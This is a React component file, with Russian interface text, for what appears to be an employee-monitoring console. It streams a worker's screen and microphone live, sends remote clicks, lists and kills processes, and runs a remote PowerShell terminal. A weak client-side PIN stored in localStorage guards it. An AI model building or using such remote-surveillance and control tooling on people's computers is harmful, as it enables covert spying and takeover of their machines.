import { useEffect, useRef, useState } from 'react'
import {
  fetchWorkerScreenshot, requestWorkerScreenshot,
  createScreenViewWs, createMicViewWs,
  fetchWorkerProcesses, killWorkerProcess,
  sendWorkerCommand, sendWorkerClick, createShellViewWs,
} from '../api'

const DEFAULT_PIN = '1234'

export function PinModal({ onSuccess, onClose }) {
  const [pin, setPin] = useState('')
  const [newPin, setNewPin] = useState('')
  const [changing, setChanging] = useState(false)
  const [error, setError] = useState('')

  const savedPin = localStorage.getItem('spyPin') || DEFAULT_PIN

  const handleSubmit = (e) => {
    e.preventDefault()
    if (pin !== savedPin) { setError('Неверный пинкод'); return }
    onSuccess()
  }

  const handleChangePin = (e) => {
    e.preventDefault()
    if (pin !== savedPin) { setError('Неверный текущий пинкод'); return }
    if (newPin.length < 4) { setError('Минимум 4 цифры'); return }
    localStorage.setItem('spyPin', newPin)
    onSuccess()
  }

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70" onClick={onClose}>
      <div className="bg-[#1a1d2e] border border-white/10 rounded-2xl p-6 w-72 shadow-2xl" onClick={(e) => e.stopPropagation()}>
        <div className="flex items-center justify-between mb-5">
          <div className="font-semibold text-white">🔒 Мониторинг</div>
          <button onClick={onClose} className="text-slate-400 hover:text-white text-lg leading-none">×</button>
        </div>
        {!changing ? (
          <form onSubmit={handleSubmit} className="space-y-3">
            <input
              autoFocus type="password" inputMode="numeric" placeholder="Пинкод"
              value={pin} onChange={(e) => { setPin(e.target.value); setError('') }}
              className="w-full bg-black/30 border border-white/10 rounded-lg px-3 py-2 text-sm text-white text-center tracking-widest focus:outline-none focus:border-brand-500"
            />
            {error && <p className="text-xs text-red-400 text-center">{error}</p>}
            <button type="submit" className="w-full bg-brand-500 hover:bg-brand-600 text-white rounded-lg py-2 text-sm font-medium transition-colors">Войти</button>
            <button type="button" onClick={() => setChanging(true)} className="w-full text-xs text-slate-500 hover:text-slate-300 transition-colors py-1">Сменить пинкод</button>
          </form>
        ) : (
          <form onSubmit={handleChangePin} className="space-y-3">
            <input type="password" inputMode="numeric" placeholder="Текущий пинкод" value={pin}
              onChange={(e) => { setPin(e.target.value); setError('') }}
              className="w-full bg-black/30 border border-white/10 rounded-lg px-3 py-2 text-sm text-white text-center tracking-widest focus:outline-none focus:border-brand-500"
            />
            <input type="password" inputMode="numeric" placeholder="Новый пинкод" value={newPin}
              onChange={(e) => { setNewPin(e.target.value); setError('') }}
              className="w-full bg-black/30 border border-white/10 rounded-lg px-3 py-2 text-sm text-white text-center tracking-widest focus:outline-none focus:border-brand-500"
            />
            {error && <p className="text-xs text-red-400 text-center">{error}</p>}
            <button type="submit" className="w-full bg-brand-500 hover:bg-brand-600 text-white rounded-lg py-2 text-sm font-medium transition-colors">Сохранить</button>
            <button type="button" onClick={() => setChanging(false)} className="w-full text-xs text-slate-500 hover:text-slate-300 transition-colors py-1">Назад</button>
          </form>
        )}
      </div>
    </div>
  )
}

// ── Screen tab ────────────────────────────────────────────────────────────────
function ScreenTab({ worker }) {
  const [imgUrl, setImgUrl] = useState(null)
  const [capturedAt, setCapturedAt] = useState(null)
  const [loading, setLoading] = useState(false)
  const [waiting, setWaiting] = useState(false)
  const [notFound, setNotFound] = useState(false)
  const [live, setLive] = useState(false)
  const prevUrlRef = useRef(null)
  const pollRef = useRef(null)
  const wsRef = useRef(null)
  const liveImgRef = useRef(null)

  const loadShot = async () => {
    try {
      const res = await fetchWorkerScreenshot(worker.id)
      if (prevUrlRef.current) URL.revokeObjectURL(prevUrlRef.current)
      const url = URL.createObjectURL(res.data)
      prevUrlRef.current = url
      setImgUrl(url)
      const ts = res.headers['x-captured-at']
      setCapturedAt(ts ? new Date(Number(ts)) : new Date())
      return Number(ts) || 0
    } catch (e) {
      if (e?.response?.status === 404) setNotFound(true)
      return 0
    }
  }

  const handleRefresh = async () => {
    if (loading || waiting) return
    setWaiting(true)
    try {
      const tsBefore = capturedAt ? capturedAt.getTime() : 0
      await requestWorkerScreenshot(worker.id)
      let attempts = 0
      pollRef.current = setInterval(async () => {
        attempts++
        const ts = await loadShot()
        if (ts > tsBefore || attempts >= 5) { clearInterval(pollRef.current); setWaiting(false) }
      }, 2000)
    } catch { setWaiting(false) }
  }

  const stopLive = () => {
    if (wsRef.current) { wsRef.current.close(); wsRef.current = null }
    setLive(false)
  }

  const startLive = () => {
    if (wsRef.current) return
    const ws = createScreenViewWs(worker.id)
    ws.binaryType = 'arraybuffer'
    ws.onmessage = (e) => {
      const blob = new Blob([e.data], { type: 'image/jpeg' })
      const url = URL.createObjectURL(blob)
      if (liveImgRef.current) {
        const old = liveImgRef.current.src
        liveImgRef.current.src = url
        if (old.startsWith('blob:')) URL.revokeObjectURL(old)
      }
      setCapturedAt(new Date())
    }
    ws.onclose = () => { wsRef.current = null; setLive(false) }
    wsRef.current = ws
    setLive(true)
  }

  const toggleLive = () => live ? stopLive() : startLive()

  const handleLiveClick = (e) => {
    if (!live) return
    const rect = e.currentTarget.getBoundingClientRect()
    sendWorkerClick(worker.id, (e.clientX - rect.left) / rect.width, (e.clientY - rect.top) / rect.height).catch(() => {})
  }

  useEffect(() => {
    setLoading(true)
    loadShot().finally(() => setLoading(false))
    return () => {
      if (pollRef.current) clearInterval(pollRef.current)
      if (prevUrlRef.current) URL.revokeObjectURL(prevUrlRef.current)
      stopLive()
    }
  }, [])

  const age = capturedAt ? Math.floor((Date.now() - capturedAt.getTime()) / 1000) : null
  const ageStr = age === null ? '' : age < 60 ? `${age}с назад` : age < 3600 ? `${Math.floor(age / 60)}м назад` : `${Math.floor(age / 3600)}ч назад`

  return (
    <div>
      <div className="flex items-center justify-between mb-3">
        {capturedAt ? <span className="text-xs text-slate-500">{live ? 'Live' : 'Снято'}: {ageStr}</span> : <span />}
        <div className="flex items-center gap-2">
          <button onClick={toggleLive} className={`text-xs px-3 py-1.5 rounded-lg border font-medium transition-colors ${live ? 'bg-red-500/15 border-red-500/30 text-red-400' : 'bg-green-500/10 border-green-500/30 text-green-400'}`}>
            {live ? '⏹ Стоп' : '▶ Live ~10 FPS'}
          </button>
          {!live && (
            <button onClick={handleRefresh} disabled={loading || waiting} className="text-xs px-3 py-1.5 rounded-lg bg-slate-700/50 border border-white/10 text-slate-300 hover:text-white transition-colors disabled:opacity-50">
              {waiting ? 'Ждём...' : loading ? '...' : 'Скриншот'}
            </button>
          )}
        </div>
      </div>
      <div className="rounded-xl overflow-hidden bg-black min-h-[180px] flex items-center justify-center">
        {notFound && !imgUrl && !live && <div className="text-slate-500 text-sm py-12">Снимков нет — нажмите «Скриншот»</div>}
        {!notFound && !imgUrl && loading && <div className="text-slate-500 text-sm py-12">Загрузка...</div>}
        {imgUrl && !live && <img src={imgUrl} alt="screenshot" className="w-full h-auto block" />}
        <img ref={liveImgRef} alt="live" onClick={handleLiveClick} className={`w-full h-auto block ${live ? 'cursor-crosshair' : 'hidden'}`} />
      </div>
    </div>
  )
}

// ── Mic tab ───────────────────────────────────────────────────────────────────
function MicTab({ worker }) {
  const [listening, setListening] = useState(false)
  const wsRef = useRef(null)
  const sourceBufferRef = useRef(null)
  const audioRef = useRef(null)
  const mediaSourceRef = useRef(null)
  const queueRef = useRef([])
  const appendingRef = useRef(false)

  const appendNext = () => {
    const sb = sourceBufferRef.current
    if (!sb || sb.updating || appendingRef.current || queueRef.current.length === 0) return
    appendingRef.current = true
    const data = queueRef.current.shift()
    try { sb.appendBuffer(data) } catch { appendingRef.current = false }
  }

  const startListening = () => {
    const ms = new MediaSource()
    mediaSourceRef.current = ms
    const audio = audioRef.current
    audio.src = URL.createObjectURL(ms)
    ms.addEventListener('sourceopen', () => {
      try {
        const sb = ms.addSourceBuffer('audio/webm;codecs=opus')
        sourceBufferRef.current = sb
        sb.addEventListener('updateend', () => {
          appendingRef.current = false
          appendNext()
          if (audio.buffered.length > 0) {
            const end = audio.buffered.end(audio.buffered.length - 1)
            if (end - audio.currentTime > 1.5) audio.currentTime = end - 0.1
          }
        })
      } catch (e) { console.error('SourceBuffer error:', e) }
    })
    audio.play().catch(() => {})
    const ws = createMicViewWs(worker.id)
    ws.binaryType = 'arraybuffer'
    ws.onmessage = (e) => { queueRef.current.push(e.data); appendNext() }
    ws.onclose = () => setListening(false)
    wsRef.current = ws
    setListening(true)
  }

  const stopListening = () => {
    if (wsRef.current) { wsRef.current.close(); wsRef.current = null }
    const audio = audioRef.current
    if (audio) { audio.pause(); audio.src = '' }
    sourceBufferRef.current = null
    queueRef.current = []
    appendingRef.current = false
    setListening(false)
  }

  useEffect(() => () => stopListening(), [])

  return (
    <div className="flex flex-col items-center gap-4 py-6">
      <div className={`w-20 h-20 rounded-full flex items-center justify-center text-3xl transition-all ${listening ? 'bg-red-500/20 ring-4 ring-red-500/40 animate-pulse' : 'bg-slate-700/50'}`}>🎙</div>
      <p className="text-sm text-slate-400">{listening ? 'Слушаем микрофон...' : 'Нажмите чтобы начать'}</p>
      <button
        onClick={listening ? stopListening : startListening}
        className={`px-6 py-2 rounded-lg text-sm font-medium transition-colors ${listening ? 'bg-red-500/20 border border-red-500/30 text-red-400 hover:bg-red-500/30' : 'bg-green-500/15 border border-green-500/30 text-green-400 hover:bg-green-500/25'}`}
      >
        {listening ? 'Остановить' : 'Слушать'}
      </button>
      <audio ref={audioRef} className="hidden" />
    </div>
  )
}

// ── Processes tab ─────────────────────────────────────────────────────────────
function ProcessesTab({ worker }) {
  const [processes, setProcesses] = useState([])
  const [updatedAt, setUpdatedAt] = useState(null)
  const [search, setSearch] = useState('')
  const [loading, setLoading] = useState(false)
  const [killing, setKilling] = useState(null)

  const load = async () => {
    setLoading(true)
    try {
      const data = await fetchWorkerProcesses(worker.id)
      setProcesses(data.processes || [])
      setUpdatedAt(data.updated_at ? new Date(data.updated_at) : null)
    } catch {} finally { setLoading(false) }
  }

  const handleKill = async (name) => {
    if (!confirm(`Завершить процесс «${name}»?`)) return
    setKilling(name)
    try { await killWorkerProcess(worker.id, name); setTimeout(load, 3000) }
    catch {} finally { setKilling(null) }
  }

  useEffect(() => { load() }, [])

  const filtered = processes.filter(p => p.toLowerCase().includes(search.toLowerCase()))
  const age = updatedAt ? Math.floor((Date.now() - updatedAt.getTime()) / 1000) : null
  const ageStr = age === null ? '' : age < 60 ? `${age}с назад` : `${Math.floor(age / 60)}м назад`

  return (
    <div className="flex flex-col" style={{ minHeight: 0 }}>
      <div className="flex items-center justify-between mb-3">
        {updatedAt ? <span className="text-xs text-slate-500">{ageStr} · {processes.length} процессов</span> : <span />}
        <button onClick={load} disabled={loading} className="text-xs px-3 py-1.5 rounded-lg bg-slate-700/50 border border-white/10 text-slate-300 hover:text-white disabled:opacity-50 transition-colors">
          {loading ? '...' : 'Обновить'}
        </button>
      </div>
      <input value={search} onChange={(e) => setSearch(e.target.value)} placeholder="Поиск процесса..."
        className="w-full bg-black/30 border border-white/10 rounded-lg px-3 py-2 text-sm text-white placeholder-slate-500 focus:outline-none focus:border-brand-500 mb-2"
      />
      <div className="overflow-y-auto space-y-0.5" style={{ maxHeight: 260 }}>
        {filtered.length === 0 && <div className="text-slate-500 text-sm text-center py-8">{loading ? 'Загрузка...' : 'Нет данных'}</div>}
        {filtered.map((p, i) => (
          <div key={i} className="flex items-center justify-between px-3 py-1.5 rounded hover:bg-white/5 group">
            <span className="text-sm text-slate-300 font-mono">{p}</span>
            <button onClick={() => handleKill(p)} disabled={killing === p}
              className="text-xs px-2 py-0.5 rounded text-red-400 hover:bg-red-400/15 opacity-0 group-hover:opacity-100 transition-all disabled:opacity-50">
              {killing === p ? '...' : 'завершить'}
            </button>
          </div>
        ))}
      </div>
    </div>
  )
}

// ── Controls tab ──────────────────────────────────────────────────────────────
function ControlsTab({ worker }) {
  const [done, setDone] = useState({})
  const send = async (cmd, label) => {
    if (!confirm(`${label} для ${worker.username}?`)) return
    await sendWorkerCommand(worker.id, cmd)
    setDone(d => ({ ...d, [cmd]: true }))
  }

  return (
    <div className="flex flex-col gap-3 py-4">
      <div className="bg-black/20 border border-white/5 rounded-xl p-4 flex items-center justify-between">
        <div>
          <div className="text-sm text-white font-medium">Закрыть приложение</div>
          <div className="text-xs text-slate-500 mt-0.5">Принудительно завершает процесс воркер-приложения</div>
        </div>
        <button onClick={() => send('quit', 'Закрыть приложение')} disabled={done['quit']}
          className="text-xs px-4 py-2 rounded-lg bg-orange-500/15 border border-orange-500/30 text-orange-400 hover:bg-orange-500/25 disabled:opacity-50 transition-colors">
          {done['quit'] ? 'Отправлено' : '⏹ Закрыть'}
        </button>
      </div>
      <div className="bg-black/20 border border-white/5 rounded-xl p-4 flex items-center justify-between">
        <div>
          <div className="text-sm text-white font-medium">Убрать из автозапуска</div>
          <div className="text-xs text-slate-500 mt-0.5">Удаляет приложение из автостарта Windows</div>
        </div>
        <button onClick={() => send('remove-autostart', 'Убрать из автозапуска')} disabled={done['remove-autostart']}
          className="text-xs px-4 py-2 rounded-lg bg-slate-700/50 border border-white/10 text-slate-300 hover:text-white disabled:opacity-50 transition-colors">
          {done['remove-autostart'] ? 'Отправлено' : '🚫 Убрать'}
        </button>
      </div>
    </div>
  )
}

// ── Shell tab ─────────────────────────────────────────────────────────────────
function ShellTab({ worker }) {
  const [lines, setLines] = useState([{ type: 'info', text: 'Подключение...' }])
  const [input, setInput] = useState('')
  const [running, setRunning] = useState(false)
  const [connected, setConnected] = useState(false)
  const [workerOnline, setWorkerOnline] = useState(false)
  const wsRef = useRef(null)
  const bottomRef = useRef(null)
  const historyRef = useRef([])
  const historyIdxRef = useRef(-1)

  useEffect(() => {
    const ws = createShellViewWs(worker.id)
    ws.onopen = () => setConnected(true)
    ws.onclose = () => {
      setConnected(false)
      setLines(l => [...l, { type: 'info', text: '(соединение закрыто)' }])
    }
    ws.onmessage = (e) => {
      const text = e.data
      if (text.startsWith('\x01')) {
        const status = text.slice(1)
        setWorkerOnline(status === 'connected')
        setLines(l => [...l, { type: 'info', text: status === 'connected' ? 'Воркер подключён' : 'Воркер офлайн' }])
        return
      }
      setRunning(false)
      setLines(l => [...l, { type: 'output', text }])
      setTimeout(() => bottomRef.current?.scrollIntoView({ behavior: 'smooth' }), 50)
    }
    wsRef.current = ws
    return () => ws.close()
  }, [])

  const sendCmd = () => {
    const cmd = input.trim()
    if (!cmd || !wsRef.current || running || !workerOnline) return
    historyRef.current = [cmd, ...historyRef.current.slice(0, 49)]
    historyIdxRef.current = -1
    setLines(l => [...l, { type: 'cmd', text: cmd }])
    wsRef.current.send(cmd)
    setInput('')
    setRunning(true)
    setTimeout(() => bottomRef.current?.scrollIntoView({ behavior: 'smooth' }), 50)
  }

  const handleKeyDown = (e) => {
    if (e.key === 'Enter') { sendCmd(); return }
    if (e.key === 'ArrowUp') {
      e.preventDefault()
      const idx = Math.min(historyIdxRef.current + 1, historyRef.current.length - 1)
      historyIdxRef.current = idx
      setInput(historyRef.current[idx] ?? '')
    }
    if (e.key === 'ArrowDown') {
      e.preventDefault()
      const idx = Math.max(historyIdxRef.current - 1, -1)
      historyIdxRef.current = idx
      setInput(idx === -1 ? '' : historyRef.current[idx] ?? '')
    }
  }

  return (
    <div className="flex flex-col gap-3">
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-2">
          <span className={`w-2 h-2 rounded-full ${workerOnline ? 'bg-green-400' : 'bg-red-500'}`} />
          <span className="text-xs text-slate-500">{workerOnline ? 'воркер подключён' : 'воркер офлайн'}</span>
        </div>
        <button onClick={() => setLines([])} className="text-xs text-slate-600 hover:text-slate-400 transition-colors">очистить</button>
      </div>
      <div className="bg-black/60 rounded-xl p-3 font-mono text-xs overflow-y-auto" style={{ minHeight: 260, maxHeight: 360 }}>
        {lines.map((l, i) => (
          <div key={i} className={l.type === 'cmd' ? 'text-green-400 mt-1' : l.type === 'info' ? 'text-yellow-600 italic' : 'text-slate-200 whitespace-pre-wrap break-all'}>
            {l.type === 'cmd' ? `PS> ${l.text}` : l.text}
          </div>
        ))}
        {running && <div className="text-slate-500 animate-pulse mt-1">выполняется...</div>}
        <div ref={bottomRef} />
      </div>
      <div className="flex items-center gap-2">
        <span className="text-green-400 font-mono text-xs flex-shrink-0">PS&gt;</span>
        <input
          value={input} onChange={(e) => setInput(e.target.value)} onKeyDown={handleKeyDown}
          disabled={!connected || !workerOnline || running}
          placeholder={!connected ? 'нет соединения' : !workerOnline ? 'воркер офлайн' : 'команда... (↑↓ — история)'}
          className="flex-1 bg-black/40 border border-white/10 rounded-lg px-3 py-2 text-sm text-white font-mono placeholder-slate-600 focus:outline-none focus:border-brand-500 disabled:opacity-40"
          autoComplete="off" spellCheck={false}
        />
        <button onClick={sendCmd} disabled={!connected || !workerOnline || running || !input.trim()}
          className="px-4 py-2 text-sm bg-brand-500/20 border border-brand-500/30 text-brand-400 rounded-lg hover:bg-brand-500/30 disabled:opacity-40 transition-colors flex-shrink-0">
          Выполнить
        </button>
      </div>
    </div>
  )
}

// ── Combined modal ────────────────────────────────────────────────────────────
const TABS = [
  { id: 'screen', label: '📷 Экран' },
  { id: 'mic', label: '🎙 Микрофон' },
  { id: 'processes', label: '⚙ Процессы' },
  { id: 'controls', label: '🛠 Управление' },
  { id: 'shell', label: '💻 Терминал' },
]

export function MonitoringModal({ worker, onClose, defaultTab = 'screen' }) {
  const [tab, setTab] = useState(defaultTab)

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/75" onClick={onClose}>
      <div
        className="bg-[#1a1d2e] border border-white/10 rounded-2xl shadow-2xl flex flex-col"
        style={{ width: '860px', maxWidth: 'calc(100vw - 32px)', maxHeight: 'calc(100vh - 48px)' }}
        onClick={(e) => e.stopPropagation()}
      >
        <div className="flex items-center justify-between px-6 py-4 border-b border-white/10 flex-shrink-0">
          <div className="flex items-center gap-3">
            <span className="text-white font-semibold">{worker.username}</span>
            <span className="text-slate-500 text-sm">— мониторинг</span>
          </div>
          <button onClick={onClose} className="text-slate-400 hover:text-white text-xl leading-none transition-colors">×</button>
        </div>
        <div className="flex gap-1 px-6 pt-4 flex-shrink-0">
          {TABS.map(t => (
            <button key={t.id} onClick={() => setTab(t.id)}
              className={`text-sm px-4 py-2 rounded-lg font-medium transition-colors ${tab === t.id ? 'bg-brand-500/15 text-brand-400' : 'text-slate-400 hover:text-white hover:bg-white/5'}`}>
              {t.label}
            </button>
          ))}
        </div>
        <div className="flex-1 overflow-auto px-6 py-4">
          {tab === 'screen' && <ScreenTab worker={worker} />}
          {tab === 'mic' && <MicTab worker={worker} />}
          {tab === 'processes' && <ProcessesTab worker={worker} />}
          {tab === 'controls' && <ControlsTab worker={worker} />}
          {tab === 'shell' && <ShellTab worker={worker} />}
        </div>
      </div>
    </div>
  )
}
